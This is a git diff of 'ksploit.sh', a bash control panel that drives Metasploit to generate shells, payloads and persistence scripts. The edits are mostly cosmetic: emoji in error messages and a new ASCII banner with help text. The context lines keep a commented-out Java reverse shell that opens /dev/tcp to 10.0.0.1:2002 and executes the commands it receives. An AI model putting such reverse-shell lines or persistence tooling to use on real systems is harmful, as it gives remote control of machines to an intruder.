@@ -91,7 +91,7 @@ shells()
         echo "${BLUE}          💰       Crafting Shells       💰          "
         echo "${BLUE}-----------------------------------------------------"
 	echo ${YELLOW}
-	PS3="${YELLOW}Enter your choice (9=QUIT)" 
+	PS3="${YELLOW}Enter your choice (8=QUIT)" 
 
 	options=("Bash" "Perl" "Python" "Python_3" "PHP" "Ruby" "Netcat" "Quit")
 	select opt in "${options[@]}"
@@ -152,14 +152,11 @@ shells()
 		 #JAVA) r = Runtime.getRuntime()
 #			p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])
 #			p.waitFor()
-		    
-		    
-		    
 		"Quit")
 	 	    clear		
 		    echo "Good Bye" && break
 		    ;;
-		*) echo invalid option;;
+		*) echo 💀 invalid option 💀;;
 	    esac
 	done
 }
@@ -256,7 +253,7 @@ payloads()
 	 	    clear		
 		    echo "Good Bye" && break
 		    ;;
-		*) echo invalid option;;
+		*) echo 💀 invalid option 💀;;
 	    esac
 	done
 }
@@ -337,7 +334,7 @@ do
             clear
             echo "Good Bye" && break
             ;;
-        *) echo invalid option;;
+        *) echo 💀 invalid option 💀;;
     esac
 done
 }                                     
@@ -360,12 +357,37 @@ persist()
 ################################################################################
 ################################################################################
 
-[[ `id -u` -eq 0 ]] || { echo -e "${RED}Must run as root (sudo ./ksploit.sh)"; exit 1; }
+[[ `id -u` -eq 0 ]] || { echo -e "${RED}💀 Must run as root (sudo ./ksploit.sh) 💀"; exit 1; }
 resize -s 30 60
 clear
 SERVICE=service;
 wdir=$(pwd)
 clear
+   clear
+   echo
+   echo "    ${RED} _  __${LIGHT_MAGENTA} ____       _       _ _   "
+   echo "    ${RED}| |/ /${LIGHT_MAGENTA}/ ___| ___ | | ___ (_) |_ "
+   echo "    ${RED}| ' /${LIGHT_MAGENTA}\___ \| '_ \| |/ _ \| | __|"
+   echo "    ${RED}| . \\${LIGHT_MAGENTA} ___) | |_) | | (_) | | |_ "
+   echo "    ${RED}|_|\_\\${LIGHT_MAGENTA}____/| .__/|_|\___/|_|\__|"
+   echo "    ${RED}       ${LIGHT_MAGENTA}    |_|                  "
+   echo "       ${GREEN}   🕵🔎 By KaotickJ 👽 " 
+   #	echo "			🖥️ 🐧🍎🤖🐍♻🐚		  "
+   echo 
+   echo "${ITALIC_BLUE}#             HELP MENU               #"
+   echo "${BLUE}KSploit is a user friendly control panel in which to drive many metasploit tasks such as generating shells, payloads, and persistence scripts on the fly, starting listeners, and suggesting payloads and exploits."
+   echo
+   echo "${LIGHT_MAGENTA}Syntax: ksploit.sh [-h|-L|-S|-m|-p]"
+   echo ${GREEN}
+   echo "options:"
+   echo "-------------------------------------------"
+   echo "${YELLOW}-h ${BLUE}To show this message"
+   echo "${YELLOW}-L ${BLUE}To load the listeners menu."
+   echo "${YELLOW}-S ${BLUE}To load the shells menu"
+   echo "${YELLOW}-m ${BLUE}To start Msfconsole"
+   echo "${YELLOW}-p ${BLUE}To load the persistence menu."
+   echo 
+   echo 
 
 while getopts ":h?l?:s?:m?:p?:P?" opt; 
 do
@@ -382,9 +404,10 @@ do
          ;;
        P) payloads
          ;;
-       *) echo invalid option ./ksploit.sh -h for help
-       ;;
+       *) 
+         echo ${RED}
+         echo "💀 invalid option ./ksploit.sh -h for help 💀"
+         exit;;
     esac
 done
 tput sgr0 
-
